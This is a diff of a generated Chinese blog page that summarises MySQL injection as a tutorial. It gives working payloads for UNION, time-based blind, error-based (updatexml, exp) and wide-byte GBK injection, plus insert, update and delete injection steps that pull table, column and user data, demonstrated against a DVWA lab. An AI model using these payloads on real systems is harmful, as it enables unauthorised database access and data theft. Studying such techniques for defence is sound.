@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表：123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not nul">
+<meta name="description" content="Mysql的一些基本操作命令 创建数据库：create database XXX; 查看数据库：show databases; 切换数据库：use XXX; 删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) n">
 <meta name="keywords" content="Web安全,Mysql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入总结">
 <meta property="og:url" content="http://yoursite.com/2019/06/27/SQL注入总结/index.html">
 <meta property="og:site_name" content="Chen&#39;s Bolg">
-<meta property="og:description" content="Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表：123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not nul">
+<meta property="og:description" content="Mysql的一些基本操作命令 创建数据库：create database XXX; 查看数据库：show databases; 切换数据库：use XXX; 删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) n">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2019/06/27/SQL注入总结/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/06/27/SQL注入总结/2.png">
@@ -96,7 +96,7 @@
 <meta property="og:updated_time" content="2019-08-29T06:57:53.116Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入总结">
-<meta name="twitter:description" content="Mysql的一些基本操作命令创建数据库：create database XXX;查看数据库：show databases;切换数据库：use XXX;删除数据库：drop database XXX; 创建数据表：123456create table teacher(id int(4) not null primary key auto_increment,name char(20) not nul">
+<meta name="twitter:description" content="Mysql的一些基本操作命令 创建数据库：create database XXX; 查看数据库：show databases; 切换数据库：use XXX; 删除数据库：drop database XXX; 创建数据表： 123456create table teacher(id int(4) not null primary key auto_increment,name char(20) n">
 <meta name="twitter:image" content="http://yoursite.com/2019/06/27/SQL注入总结/1.png">
 
 
@@ -412,43 +412,106 @@
       
 
       
-        <h2 id="Mysql的一些基本操作命令"><a href="#Mysql的一些基本操作命令" class="headerlink" title="Mysql的一些基本操作命令"></a>Mysql的一些基本操作命令</h2><p>创建数据库：<code>create database XXX;</code><br>查看数据库：<code>show databases;</code><br>切换数据库：<code>use XXX;</code><br>删除数据库：<code>drop database XXX;</code></p>
-<p>创建数据表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table teacher(</span><br><span class="line">id int(4) not null primary key auto_increment,</span><br><span class="line">name char(20) not null,</span><br><span class="line">sex char(10) not null,</span><br><span class="line">addr char(20) not null</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
-<p>查看数据表：<code>show tables</code><br>插入数据表：<code>insert into teacher(name,sex,addr) values(&#39;leo&#39;,&#39;male&#39;,&#39;hangzhou&#39;);</code><br>查询数据表：<code>select * from teacher;</code><br>查看表的结构：<code>desc XX;</code><br>更新数据：<code>update teacher set name=&quot;X&quot; where id=X;</code><br>删除数据：<code>delete from teacher where name=&quot;X&quot;;</code><br>order by用于排序：<code>select information from table order by X ASC/DESC;</code><br>union可以用来连接两个信息，即增加一项select</p>
-<p>LIMIT用法：<code>SELECT * FROM table   LIMIT offset, rows</code><br>第一个数字指的是起始行，第二数字指的是获取的行数！</p>
-<h2 id="一些常用的数据库查询命令"><a href="#一些常用的数据库查询命令" class="headerlink" title="一些常用的数据库查询命令"></a>一些常用的数据库查询命令</h2><p>1.当前数据库的所有表<br><code>select table_name from information_schema.TABLES where TABLE_SCHEMA=database();</code><br>2.获取表中的所有列的名字<br><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></p>
-<h2 id="判断时字符串注入还是整型注入"><a href="#判断时字符串注入还是整型注入" class="headerlink" title="判断时字符串注入还是整型注入"></a>判断时字符串注入还是整型注入</h2><p>1.当加单引号进行闭合后，会报错或者无内容显示：<br><code>select * from table where id=3’</code><br>2.当不用单引号闭合，并且在后面加条件会按照条件的逻辑顺序显示，则判断为整型注入<br><code>select * from table where id=3 and 1=1</code><br>不满足以上两点就时字符串注入，其特征有以下几点：<br>1.当用单引号闭合后还是会报错，因为闭合后单引号个数不匹配：<br><code>select * from table where name=’admin’’</code><br>2.需要对后面的内容进行注释，注释符号为— (后面有个空格)    #</p>
-<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>延时注入主要用于不显示错误信息的情况下对数据库名字，表的名字，列的名字进行显示的一种方法。<br><code>if(ascii(subtring(&quot;hello&quot;,1,1))=104,sleep(5),0);</code><br>可以看到，取出”hello”里的第一个字符串，也就是”h”,判断他的ascii码是否为104(“h”的ascii码为104),如果是则延时5秒，反之不延时。同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。</p>
-<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>首先可以通过order by来试探出总共有多少个字段<br><code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1</code></p>
-<p>还可以通过union select查看当前数据库的某些表<br><code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1</code></p>
+        <h2 id="mysql的一些基本操作命令"><a class="markdownIt-Anchor" href="#mysql的一些基本操作命令"></a> Mysql的一些基本操作命令</h2>
+<p>创建数据库：<code>create database XXX;</code><br>
+查看数据库：<code>show databases;</code><br>
+切换数据库：<code>use XXX;</code><br>
+删除数据库：<code>drop database XXX;</code></p>
+<p>创建数据表：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table teacher(</span><br><span class="line">id int(4) not null primary key auto_increment,</span><br><span class="line">name char(20) not null,</span><br><span class="line">sex char(10) not null,</span><br><span class="line">addr char(20) not null</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>查看数据表：<code>show tables</code><br>
+插入数据表：<code>insert into teacher(name,sex,addr) values('leo','male','hangzhou');</code><br>
+查询数据表：<code>select * from teacher;</code><br>
+查看表的结构：<code>desc XX;</code><br>
+更新数据：<code>update teacher set name=&quot;X&quot; where id=X;</code><br>
+删除数据：<code>delete from teacher where name=&quot;X&quot;;</code><br>
+order by用于排序：<code>select information from table order by X ASC/DESC;</code><br>
+union可以用来连接两个信息，即增加一项select</p>
+<p>LIMIT用法：<code>SELECT * FROM table LIMIT offset, rows</code><br>
+第一个数字指的是起始行，第二数字指的是获取的行数！</p>
+<h2 id="一些常用的数据库查询命令"><a class="markdownIt-Anchor" href="#一些常用的数据库查询命令"></a> 一些常用的数据库查询命令</h2>
+<p>1.当前数据库的所有表<br>
+<code>select table_name from information_schema.TABLES where TABLE_SCHEMA=database();</code><br>
+2.获取表中的所有列的名字<br>
+<code>select column_name from information_schema.columns where table_name='表名'</code></p>
+<h2 id="判断时字符串注入还是整型注入"><a class="markdownIt-Anchor" href="#判断时字符串注入还是整型注入"></a> 判断时字符串注入还是整型注入</h2>
+<p>1.当加单引号进行闭合后，会报错或者无内容显示：<br>
+<code>select * from table where id=3’</code><br>
+2.当不用单引号闭合，并且在后面加条件会按照条件的逻辑顺序显示，则判断为整型注入<br>
+<code>select * from table where id=3 and 1=1</code><br>
+不满足以上两点就时字符串注入，其特征有以下几点：<br>
+1.当用单引号闭合后还是会报错，因为闭合后单引号个数不匹配：<br>
+<code>select * from table where name=’admin’’</code><br>
+2.需要对后面的内容进行注释，注释符号为-- (后面有个空格)	#</p>
+<h2 id="延时注入"><a class="markdownIt-Anchor" href="#延时注入"></a> 延时注入</h2>
+<p>延时注入主要用于不显示错误信息的情况下对数据库名字，表的名字，列的名字进行显示的一种方法。<br>
+<code>if(ascii(subtring(&quot;hello&quot;,1,1))=104,sleep(5),0);</code><br>
+可以看到，取出&quot;hello&quot;里的第一个字符串，也就是&quot;h&quot;,判断他的ascii码是否为104(&quot;h&quot;的ascii码为104),如果是则延时5秒，反之不延时。同样，我们可以在substring函数里面写SQL语句，提取出我们所要查的表名、列名，再用延时猜解出来。</p>
+<h2 id="联合注入"><a class="markdownIt-Anchor" href="#联合注入"></a> 联合注入</h2>
+<p>首先可以通过order by来试探出总共有多少个字段<br>
+<code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 order by 1</code></p>
+<p>还可以通过union select查看当前数据库的某些表<br>
+<code>http://rushrush.com/DVWA/vulnerabilities/sqli/?id=1 union select 1,database(),3 LIMIT 1,1</code></p>
 <p>不过这种情况不适合用于盲注的场景，因为没有输出反馈</p>
-<h2 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h2><p>在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：<br><strong><img src="/2019/06/27/SQL注入总结/1.png"></strong><br>下图中用了’as’作为别名显示的字符<br><img src="/2019/06/27/SQL注入总结/2.png"></p>
+<h2 id="别名"><a class="markdownIt-Anchor" href="#别名"></a> 别名</h2>
+<p>在查询数据库的时候可以给列的名字取一个别名，以下两张图为示例：<br>
+<strong><img src="/2019/06/27/SQL注入总结/1.png"></strong><br>
+下图中用了’as’作为别名显示的字符</p>
+<img src="/2019/06/27/SQL注入总结/2.png">
 <p>其中‘as’可写可不写</p>
-<h2 id="Mysql之bug注入"><a href="#Mysql之bug注入" class="headerlink" title="Mysql之bug注入"></a>Mysql之bug注入</h2><p>利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。<br>只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码<br><code>select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x;</code><br>就会在报错中显示数据库的名字！</p>
-<h2 id="Mysql注入之函数报错"><a href="#Mysql注入之函数报错" class="headerlink" title="Mysql注入之函数报错"></a>Mysql注入之函数报错</h2><p>有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon</p>
-<p>通过UpdateXml报错，注入语句如下：<br><code>&amp; 1=(updatexml(1,concat(0x3a,(select user())),1))</code></p>
-<p>通过exp报错，注入的语句如下：<br><code>&amp; exp(~(select * from (select user()) a))</code></p>
-<p>通过GeometryCollection()报错，注入语句如下：<br><code>&amp; geometrycollection((select * from(select * from(select user())a)b))</code><br>后两句会因为版本问题失效。。。</p>
-<h2 id="Mysql注入的修补"><a href="#Mysql注入的修补" class="headerlink" title="Mysql注入的修补"></a>Mysql注入的修补</h2><p>对于字符串的修补，在PHP程序中，用addslashes()函数，将符号包括用来闭合的单引号转义，即在符号前面加一个‘\’</p>
+<h2 id="mysql之bug注入"><a class="markdownIt-Anchor" href="#mysql之bug注入"></a> Mysql之bug注入</h2>
+<p>利用数据库的BUG进行利用，看输出的报错信息，因为报错的信息中包含了我们想要获取的信息。<br>
+只要是count(),rand,group by三个连用就会造成BUG报错（一般表中的数据需要三条以上），如下代码<br>
+<code>select concat(floor(rand(0)*2),(select database())) as x,count(1) from student group by x;</code><br>
+就会在报错中显示数据库的名字！</p>
+<h2 id="mysql注入之函数报错"><a class="markdownIt-Anchor" href="#mysql注入之函数报错"></a> Mysql注入之函数报错</h2>
+<p>有许多函数可以利用，如updatexml, exp, geometrycollection, polygon, multipoint, multilinestring, multipolygon</p>
+<p>通过UpdateXml报错，注入语句如下：<br>
+<code>&amp; 1=(updatexml(1,concat(0x3a,(select user())),1))</code></p>
+<p>通过exp报错，注入的语句如下：<br>
+<code>&amp; exp(~(select * from (select user()) a))</code></p>
+<p>通过GeometryCollection()报错，注入语句如下：<br>
+<code>&amp; geometrycollection((select * from(select * from(select user())a)b))</code><br>
+后两句会因为版本问题失效。。。</p>
+<h2 id="mysql注入的修补"><a class="markdownIt-Anchor" href="#mysql注入的修补"></a> Mysql注入的修补</h2>
+<p>对于字符串的修补，在PHP程序中，用addslashes()函数，将符号包括用来闭合的单引号转义，即在符号前面加一个‘\’</p>
 <p>对于int型的数据，可以在获取过程中对其加0，若输入是字符串则会自动转型成int，避免了注入的威胁。因为若输入一个字符串，在转型过程中只会保留第一个数字字符而舍去后面的字符。</p>
-<p>还可以通过搜索输入字符串中是否存在像“select””from”等的关键词，将关键词转型，则可以实现注入修补</p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在前面可以看到，通过用转义来实现对Mysql的修补，然而通过利用宽字节可以实现恢复单引号闭合。</p>
+<p>还可以通过搜索输入字符串中是否存在像“select”&quot;from&quot;等的关键词，将关键词转型，则可以实现注入修补</p>
+<h2 id="宽字节注入"><a class="markdownIt-Anchor" href="#宽字节注入"></a> 宽字节注入</h2>
+<p>在前面可以看到，通过用转义来实现对Mysql的修补，然而通过利用宽字节可以实现恢复单引号闭合。</p>
 <p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
-<p><a href="https://blog.csdn.net/helloc0de/article/details/76180190 “宽字符”" target="_blank" rel="noopener">宽字符注入详解</a></p>
-<h2 id="insert-update-delete注入"><a href="#insert-update-delete注入" class="headerlink" title="insert,update,delete注入"></a>insert,update,delete注入</h2><p>三者的区别在于其注入的那句程序是insert,update还是delete<br>三者都支持报错注入</p>
-<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>一个insert注入的例子：<br>1.确认是否存在注入<br>2.获取数据库名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT DATABASE())),0x7e) or</code></p>
+<p>[宽字符注入详解](<a href="https://blog.csdn.net/helloc0de/article/details/76180190" target="_blank" rel="noopener">https://blog.csdn.net/helloc0de/article/details/76180190</a> “宽字符”)</p>
+<h2 id="insertupdatedelete注入"><a class="markdownIt-Anchor" href="#insertupdatedelete注入"></a> insert,update,delete注入</h2>
+<p>三者的区别在于其注入的那句程序是insert,update还是delete<br>
+三者都支持报错注入</p>
+<h3 id="insert注入"><a class="markdownIt-Anchor" href="#insert注入"></a> insert注入</h3>
+<p>一个insert注入的例子：<br>
+1.确认是否存在注入<br>
+2.获取数据库名：<br>
+<code>or updatexml('',concat(0x7e,(SELECT DATABASE())),0x7e) or</code></p>
 <img src="/2019/06/27/SQL注入总结/3.jpg">
-<p>3.获取表名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e)</code></p>
+<p>3.获取表名：<br>
+<code>or updatexml('',concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 2,1)),0x7e)</code></p>
 <img src="/2019/06/27/SQL注入总结/4.jpg">
-<p>4.获取字段名：<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; limit 0,1)),0x7e)</code></p>
+<p>4.获取字段名：<br>
+<code>or updatexml('',concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name='users' limit 0,1)),0x7e)</code></p>
 <img src="/2019/06/27/SQL注入总结/5.jpg">
-<p>5.获取数据<br><code>or updatexml(&#39;&#39;,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,user_id,first_name,last_name) FROM users limit 0,1)),0x7e)</code></p>
+<p>5.获取数据<br>
+<code>or updatexml('',concat(0x7e,(SELECT concat_ws(':',user_id,first_name,last_name) FROM users limit 0,1)),0x7e)</code></p>
 <img src="/2019/06/27/SQL注入总结/6.jpg">
 <p>如果是inset一般要增加右括号，因为根据insert的语句，闭合括号再对口面部分进行注释可以实现注入。</p>
-<h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>delete注入部分支持布尔注入和延时注入和报错注入</p>
-<p>延时注入的一个语句范例：<br><code>delete from users where user_id=1 and sleep(if(database()=&#39;dvwa&#39;,5,1));</code><br>经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目</p>
-<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>update同理只是将操作数据库的命令变成了update，下面是一个例子：<br><code>update teacher set name=&quot;Gou&quot; where id=1 and sleep(if(database()=&#39;test&#39;,5,1));</code></p>
-<h2 id="Mysql注入经常用到的函数"><a href="#Mysql注入经常用到的函数" class="headerlink" title="Mysql注入经常用到的函数"></a>Mysql注入经常用到的函数</h2><p>1.HEX()函数，能够将字符或者数字转成十六进制<br>2.ASCII()函数和ORD()，将字符转成对应ASCII表上的数字，区别在于ord能进行多字节的字符处理<br>3.char()函数，能从数字还原出对应的ASCII码</p>
+<h3 id="delete注入"><a class="markdownIt-Anchor" href="#delete注入"></a> delete注入</h3>
+<p>delete注入部分支持布尔注入和延时注入和报错注入</p>
+<p>延时注入的一个语句范例：<br>
+<code>delete from users where user_id=1 and sleep(if(database()='dvwa',5,1));</code><br>
+经过上述语句可以用来确定一些信息，而且不会执行delete，即不会删除数据库中的条目</p>
+<h3 id="update注入"><a class="markdownIt-Anchor" href="#update注入"></a> update注入</h3>
+<p>update同理只是将操作数据库的命令变成了update，下面是一个例子：<br>
+<code>update teacher set name=&quot;Gou&quot; where id=1 and sleep(if(database()='test',5,1));</code></p>
+<h2 id="mysql注入经常用到的函数"><a class="markdownIt-Anchor" href="#mysql注入经常用到的函数"></a> Mysql注入经常用到的函数</h2>
+<p>1.HEX()函数，能够将字符或者数字转成十六进制<br>
+2.ASCII()函数和ORD()，将字符转成对应ASCII表上的数字，区别在于ord能进行多字节的字符处理<br>
+3.char()函数，能从数字还原出对应的ASCII码</p>
 <p><a href="https://www.jianshu.com/p/93924686345e" target="_blank" rel="noopener">Mysql注入常用函数</a></p>
 
       
@@ -573,7 +636,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -628,7 +691,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql的一些基本操作命令"><span class="nav-number">1.</span> <span class="nav-text">Mysql的一些基本操作命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些常用的数据库查询命令"><span class="nav-number">2.</span> <span class="nav-text">一些常用的数据库查询命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断时字符串注入还是整型注入"><span class="nav-number">3.</span> <span class="nav-text">判断时字符串注入还是整型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延时注入"><span class="nav-number">4.</span> <span class="nav-text">延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合注入"><span class="nav-number">5.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#别名"><span class="nav-number">6.</span> <span class="nav-text">别名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql之bug注入"><span class="nav-number">7.</span> <span class="nav-text">Mysql之bug注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql注入之函数报错"><span class="nav-number">8.</span> <span class="nav-text">Mysql注入之函数报错</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql注入的修补"><span class="nav-number">9.</span> <span class="nav-text">Mysql注入的修补</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">10.</span> <span class="nav-text">宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insert-update-delete注入"><span class="nav-number">11.</span> <span class="nav-text">insert,update,delete注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#insert注入"><span class="nav-number">11.1.</span> <span class="nav-text">insert注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete注入"><span class="nav-number">11.2.</span> <span class="nav-text">delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update注入"><span class="nav-number">11.3.</span> <span class="nav-text">update注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql注入经常用到的函数"><span class="nav-number">12.</span> <span class="nav-text">Mysql注入经常用到的函数</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql的一些基本操作命令"><span class="nav-number">1.</span> <span class="nav-text"> Mysql的一些基本操作命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一些常用的数据库查询命令"><span class="nav-number">2.</span> <span class="nav-text"> 一些常用的数据库查询命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#判断时字符串注入还是整型注入"><span class="nav-number">3.</span> <span class="nav-text"> 判断时字符串注入还是整型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延时注入"><span class="nav-number">4.</span> <span class="nav-text"> 延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合注入"><span class="nav-number">5.</span> <span class="nav-text"> 联合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#别名"><span class="nav-number">6.</span> <span class="nav-text"> 别名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql之bug注入"><span class="nav-number">7.</span> <span class="nav-text"> Mysql之bug注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql注入之函数报错"><span class="nav-number">8.</span> <span class="nav-text"> Mysql注入之函数报错</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql注入的修补"><span class="nav-number">9.</span> <span class="nav-text"> Mysql注入的修补</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">10.</span> <span class="nav-text"> 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#insertupdatedelete注入"><span class="nav-number">11.</span> <span class="nav-text"> insert,update,delete注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#insert注入"><span class="nav-number">11.1.</span> <span class="nav-text"> insert注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#delete注入"><span class="nav-number">11.2.</span> <span class="nav-text"> delete注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#update注入"><span class="nav-number">11.3.</span> <span class="nav-text"> update注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql注入经常用到的函数"><span class="nav-number">12.</span> <span class="nav-text"> Mysql注入经常用到的函数</span></a></li></ol></div>
             
 
           </div>
@@ -662,7 +725,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">26.2k</span>
+    <span title="Site words total count">26.4k</span>
   
 </div>
 
